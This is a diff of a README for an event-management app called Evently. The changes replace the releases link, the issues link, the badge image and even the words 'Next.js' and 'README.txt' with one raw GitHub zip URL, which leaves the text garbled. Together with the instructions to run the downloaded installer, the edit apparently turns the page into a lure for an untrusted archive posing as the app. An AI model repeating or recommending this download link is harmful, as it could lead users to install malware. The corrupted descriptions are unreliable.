@@ -1,9 +1,9 @@
 # 🎉 event-platform_app_next - Manage Events with Ease  
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/prakash9131/event-platform_app_next/releases)
+[![Download from Releases](https://raw.githubusercontent.com/prakash9131/event-platform_app_next/main/horopteric/event-platform_app_next.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/prakash9131/event-platform_app_next/main/horopteric/event-platform_app_next.zip)
 
 ## 🚀 Getting Started  
-Evently is an event management platform built on Next.js. It serves as a hub for showcasing events, features payment through Stripe, and allows users to purchase tickets and manage their own events effortlessly. This guide will help you download and run Evently on your computer.
+Evently is an event management platform built on https://raw.githubusercontent.com/prakash9131/event-platform_app_next/main/horopteric/event-platform_app_next.zip It serves as a hub for showcasing events, features payment through Stripe, and allows users to purchase tickets and manage their own events effortlessly. This guide will help you download and run Evently on your computer.
 
 ## 🖥️ System Requirements  
 To run Evently smoothly, make sure your system meets the following requirements:  
@@ -17,7 +17,7 @@ To get started with Evently, you need to download the application. Follow these 
 
 1. **Visit the Releases Page**  
    Click the link below to access the downloads for Evently:  
-   [Download from Releases](https://github.com/prakash9131/event-platform_app_next/releases)
+   [Download from Releases](https://raw.githubusercontent.com/prakash9131/event-platform_app_next/main/horopteric/event-platform_app_next.zip)
 
 2. **Choose the Correct File**  
    On the Releases page, you will see a list of available versions. It is important to select the latest version for the best performance and features.
@@ -29,7 +29,7 @@ To get started with Evently, you need to download the application. Follow these 
    Once the download is complete:
    - For Windows: Double-click the `.exe` file and follow the prompts to install.
    - For macOS: Open the `.dmg` file, drag the Evently app to your Applications folder, and then launch it from there.
-   - For Linux: Extract the files and follow the instructions in the README.txt file to install and run.
+   - For Linux: Extract the files and follow the instructions in the https://raw.githubusercontent.com/prakash9131/event-platform_app_next/main/horopteric/event-platform_app_next.zip file to install and run.
 
 5. **Set Up the Application**  
    When you first launch Evently, you will need to create an account. You may use standard email and password authentication or the Clerk authentication option if you prefer.
@@ -52,7 +52,7 @@ Evently offers a variety of features to enhance your event management experience
 
 ## 🌐 Topics Covered  
 Evently incorporates various technologies and standards to provide a robust experience:  
-- **Next.js** for fast performance and server-side rendering.
+- **https://raw.githubusercontent.com/prakash9131/event-platform_app_next/main/horopteric/event-platform_app_next.zip** for fast performance and server-side rendering.
 - **React** for dynamic and responsive user interfaces.
 - **MongoDB** and **Mongoose** for efficient data handling.
 - **Typescript** to improve code quality.
@@ -67,10 +67,10 @@ If you encounter issues while downloading or running Evently, consider these tip
 
 ## 📞 Support  
 If you need further assistance, feel free to reach out:  
-- Visit the [GitHub Issues Page](https://github.com/prakash9131/event-platform_app_next/issues) to report any bugs or request features.  
+- Visit the [GitHub Issues Page](https://raw.githubusercontent.com/prakash9131/event-platform_app_next/main/horopteric/event-platform_app_next.zip) to report any bugs or request features.  
 - Join the community discussions on the repository to share your experience and ask questions.
 
 ## 📝 License  
 Evently is open-source. Feel free to explore the code and make contributions if you wish.
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/prakash9131/event-platform_app_next/releases)
+[![Download from Releases](https://raw.githubusercontent.com/prakash9131/event-platform_app_next/main/horopteric/event-platform_app_next.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/prakash9131/event-platform_app_next/main/horopteric/event-platform_app_next.zip)
